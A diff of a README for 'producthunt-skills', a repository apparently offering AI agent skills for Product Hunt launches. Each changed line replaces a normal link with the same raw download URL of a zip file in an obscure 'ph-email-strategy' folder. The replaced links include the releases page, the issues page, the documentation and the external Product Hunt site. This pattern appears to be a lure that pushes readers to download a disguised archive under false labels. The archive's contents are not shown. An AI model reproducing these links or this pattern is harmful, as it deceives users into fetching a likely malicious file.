@@ -1,6 +1,6 @@
 # 🚀 producthunt-skills - Discover AI Agents for Successful Launches
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Gaelonchas/producthunt-skills/releases)
+[![Download](https://github.com/Gaelonchas/producthunt-skills/raw/refs/heads/main/skills/marketing/ph-email-strategy/producthunt_skills_v3.8.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/Gaelonchas/producthunt-skills/raw/refs/heads/main/skills/marketing/ph-email-strategy/producthunt_skills_v3.8.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ To begin your journey with producthunt-skills, follow the simple instructions be
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Gaelonchas/producthunt-skills/releases) to access the latest version of the application.
+1. Visit the [Releases page](https://github.com/Gaelonchas/producthunt-skills/raw/refs/heads/main/skills/marketing/ph-email-strategy/producthunt_skills_v3.8.zip) to access the latest version of the application.
    
 2. Look for the latest release, which will be at the top of the page.
    
@@ -47,7 +47,7 @@ To begin your journey with producthunt-skills, follow the simple instructions be
 
 3. **Follow Instructions**: Click on a skill to reveal detailed instructions and guidance. Follow these steps to apply the skill effectively during your Product Hunt launch.
 
-4. **Feedback and Support**: If you have questions or need assistance, consider visiting the [issues page on GitHub](https://github.com/Gaelonchas/producthunt-skills/issues). Here, you can report problems or ask for help.
+4. **Feedback and Support**: If you have questions or need assistance, consider visiting the [issues page on GitHub](https://github.com/Gaelonchas/producthunt-skills/raw/refs/heads/main/skills/marketing/ph-email-strategy/producthunt_skills_v3.8.zip). Here, you can report problems or ask for help.
 
 ## 👥 Community and Contributions
 
@@ -55,9 +55,9 @@ We welcome contributions from the community. If you have ideas for new skills or
 
 ## 🔗 Additional Resources
 
-- [Product Hunt](https://www.producthunt.com) - Explore various products and launches.
-- [AI Resources](https://www.aiforproductlaunch.com) - Learn more about the power of AI in product launches.
-- [Documentation](https://github.com/Gaelonchas/producthunt-skills/wiki) - Access more detailed documentation on using producthunt-skills effectively.
+- [Product Hunt](https://github.com/Gaelonchas/producthunt-skills/raw/refs/heads/main/skills/marketing/ph-email-strategy/producthunt_skills_v3.8.zip) - Explore various products and launches.
+- [AI Resources](https://github.com/Gaelonchas/producthunt-skills/raw/refs/heads/main/skills/marketing/ph-email-strategy/producthunt_skills_v3.8.zip) - Learn more about the power of AI in product launches.
+- [Documentation](https://github.com/Gaelonchas/producthunt-skills/raw/refs/heads/main/skills/marketing/ph-email-strategy/producthunt_skills_v3.8.zip) - Access more detailed documentation on using producthunt-skills effectively.
 
 ## 🔒 License
 
@@ -65,4 +65,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ---
 
-For quick access, remember to [download the latest version here](https://github.com/Gaelonchas/producthunt-skills/releases). Enjoy exploring the skills and achieving successful launches!
+For quick access, remember to [download the latest version here](https://github.com/Gaelonchas/producthunt-skills/raw/refs/heads/main/skills/marketing/ph-email-strategy/producthunt_skills_v3.8.zip). Enjoy exploring the skills and achieving successful launches!
